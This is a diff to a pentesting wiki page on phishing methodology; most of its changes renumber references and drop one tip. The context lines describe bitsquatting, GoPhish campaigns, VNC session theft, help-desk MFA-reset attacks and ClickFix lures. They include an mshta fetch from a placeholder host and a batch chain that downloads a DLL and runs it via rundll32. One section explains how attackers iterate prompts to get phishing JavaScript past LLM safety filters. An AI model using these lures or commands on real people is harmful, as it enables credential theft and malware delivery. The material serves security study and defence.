@@ -60,7 +60,7 @@ For example, a single bit modification in the domain "windows.com" can change it
 
 Attackers may **take advantage of this by registering multiple bit-flipping domains** that are similar to the victim's domain. Their intention is to redirect legitimate users to their own infrastructure.
 
-For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)<sup>[[11]](#references)</sup>
+For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>
 
 ### Buy a trusted domain
 
@@ -276,7 +276,7 @@ v=DMARC1; p=none
 
 You must **configure a DKIM for the new domain**. If you don't know what is a DMARC record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).
 
-This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)<sup>[[4]](#references)</sup>
+This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>
 
 > [!TIP]
 > You need to concatenate both B64 values that the DKIM key generates:
@@ -406,9 +406,6 @@ Note that the **Sending Profile allow to send a test email to see how will the f
 
 ![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)
 
-> [!TIP]
-> I would recommend to **send the test emails to 10min mails addresses** in order to avoid getting blacklisted making tests.
-
 Once everything is ready, just launch the campaign!
 
 ## Website Cloning
@@ -446,7 +443,7 @@ This is where tools like [**evilginx2**](https://github.com/kgretzky/evilginx2)*
 ### Via VNC
 
 What if instead of **sending the victim to a malicious page** with the same looks as the original one, you send him to a **VNC session with a browser connected to the real web page**? You will be able to see what he does, steal the password, the MFA used, the cookies...\
-You can do this with [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)<sup>[[3]](#references)</sup>
+You can do this with [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>
 
 ## Detecting the detection
 
@@ -468,7 +465,7 @@ Use [**Phishious** ](https://github.com/Rices/Phishious)to evaluate if your emai
 
 ## High-Touch Identity Compromise (Help-Desk MFA Reset)
 
-Modern intrusion sets increasingly skip email lures entirely and **directly target the service-desk / identity-recovery workflow** to defeat MFA.  The attack is fully "living-off-the-land": once the operator owns valid credentials they pivot with built-in admin tooling – no malware is required.<sup>[[5]](#references)</sup>
+Modern intrusion sets increasingly skip email lures entirely and **directly target the service-desk / identity-recovery workflow** to defeat MFA.  The attack is fully "living-off-the-land": once the operator owns valid credentials they pivot with built-in admin tooling – no malware is required.<sup>[[6]](#references)</sup>
 
 ### Attack flow
 1. Recon the victim 
@@ -504,7 +501,7 @@ Modern intrusion sets increasingly skip email lures entirely and **directly targ
 ---
 
 ## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
-Commodity crews offset the cost of high-touch ops with mass attacks that turn **search engines & ad networks into the delivery channel**.<sup>[[5]](#references)</sup>
+Commodity crews offset the cost of high-touch ops with mass attacks that turn **search engines & ad networks into the delivery channel**.<sup>[[6]](#references)</sup>
 
 1. **SEO poisoning / malvertising** pushes a fake result such as `chromium-update[.]site` to the top search ads.
 2. Victim downloads a small **first-stage loader** (often JS/HTA/ISO).  Examples seen by Unit 42:
@@ -527,7 +524,7 @@ Commodity crews offset the cost of high-touch ops with mass attacks that turn **
 * Hunt for LOLBins frequently abused by first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).
 
 ### Download-button click hijacking with TDS handoff
-Some fake software portals keep the visible download `href` pointing to the **real** GitHub/release URL but hijack the **first** user interaction in JavaScript and send the victim into a **Traffic Distribution System (TDS)** chain instead.<sup>[[10]](#references)</sup>
+Some fake software portals keep the visible download `href` pointing to the **real** GitHub/release URL but hijack the **first** user interaction in JavaScript and send the victim into a **Traffic Distribution System (TDS)** chain instead.<sup>[[9]](#references)</sup>
 
 ```javascript
 const cachedOpen = window.open;
@@ -552,7 +549,7 @@ Defender ideas:
 - Treat clusters of newly registered software-download domains that all load the same CloudFront/JS stage as a high-signal SEO-poisoning/TDS pattern.
 
 ### ClickFix from fake verification pages + archive-looking LOLBAS fetches
-Some TDS branches end in a fake verification page (Cloudflare/IUAM style) that tells the victim to run a trusted Windows binary such as:<sup>[[10]](#references)</sup>
+Some TDS branches end in a fake verification page (Cloudflare/IUAM style) that tells the victim to run a trusted Windows binary such as:<sup>[[9]](#references)</sup>
 
 ```cmd
 C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
@@ -564,7 +561,7 @@ Notes:
 - If you are responding to one of these chains, preserve **network + memory from the first successful run**: later replays may only show a benign installer/SFX path or fail because the payload/key release was bound to the original TDS session.
 
 ### ClickFix DLL delivery tradecraft (fake CERT update)
-* Lure: cloned national CERT advisory with an **Update** button that displays step-by-step “fix” instructions. Victims are told to run a batch that downloads a DLL and executes it via `rundll32`.<sup>[[10]](#references)</sup>
+* Lure: cloned national CERT advisory with an **Update** button that displays step-by-step “fix” instructions. Victims are told to run a batch that downloads a DLL and executes it via `rundll32`.<sup>[[12]](#references)</sup>
 * Typical batch chain observed:
   ```cmd
   echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
@@ -609,7 +606,7 @@ ai-agent-abuse-local-ai-cli-tools-and-mcp.md
 
 ## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)
 
-Attackers can ship benign-looking HTML and **generate the stealer at runtime** by asking a **trusted LLM API** for JavaScript, then executing it in-browser (e.g., `eval` or dynamic `<script>`).<sup>[[7]](#references)</sup>
+Attackers can ship benign-looking HTML and **generate the stealer at runtime** by asking a **trusted LLM API** for JavaScript, then executing it in-browser (e.g., `eval` or dynamic `<script>`).<sup>[[8]](#references)</sup>
 
 1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings in the prompt; iterate wording to bypass safety filters and reduce hallucinations.
 2. **Client-side API call:** on load, JS calls a public LLM (Gemini/DeepSeek/etc.) or a CDN proxy; only the prompt/API call is present in static HTML.
@@ -665,11 +662,11 @@ mobile-phishing-malicious-apps.md
 {{#endref}}
 
 ### WhatsApp device-linking hijack via QR social engineering
-* A lure page (e.g., fake ministry/CERT “channel”) displays a WhatsApp Web/Desktop QR and instructs the victim to scan it, silently adding the attacker as a **linked device**.
+* A lure page (e.g., fake ministry/CERT “channel”) displays a WhatsApp Web/Desktop QR and instructs the victim to scan it, silently adding the attacker as a **linked device**.<sup>[[12]](#references)</sup>
 * Attacker immediately gains chat/contact visibility until the session is removed. Victims may later see a “new device linked” notification; defenders can hunt for unexpected device-link events shortly after visits to untrusted QR pages.
 
 ### Mobile‑gated phishing to evade crawlers/sandboxes
-Operators increasingly gate their phishing flows behind a simple device check so desktop crawlers never reach the final pages. A common pattern is a small script that tests for a touch-capable DOM and posts the result to a server endpoint; non‑mobile clients receive HTTP 500 (or a blank page), while mobile users are served the full flow.<sup>[[6]](#references)</sup>
+Operators increasingly gate their phishing flows behind a simple device check so desktop crawlers never reach the final pages. A common pattern is a small script that tests for a touch-capable DOM and posts the result to a server endpoint; non‑mobile clients receive HTTP 500 (or a blank page), while mobile users are served the full flow.<sup>[[7]](#references)</sup>
 
 Minimal client snippet (typical logic):
 
@@ -703,14 +700,16 @@ Defence tips:
 
 - [1] [Generating Domain Variations Used in Phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
 - [2] [Finding Phishing: Tools and Techniques (0xPatrik)](https://0xpatrik.com/phishing-domains/)
-- [3] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
-- [4] [How To Install and Configure DKIM with Postfix on Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
-- [5] [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
-- [6] [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
-- [7] [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
-- [8] [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
-- [9] [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
-- [10] [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
+- [3] [Steal Credentials & Bypass 2FA Using noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
+- [4] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
+- [5] [How To Install and Configure DKIM with Postfix on Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
+- [6] [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
+- [7] [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
+- [8] [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
+- [9] [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
+- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
 - [11] [Hijacking traffic to Microsoft's windows.com with bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
+- [12] [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
+- [13] [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
 
 {{#include ../../banners/hacktricks-training.md}}
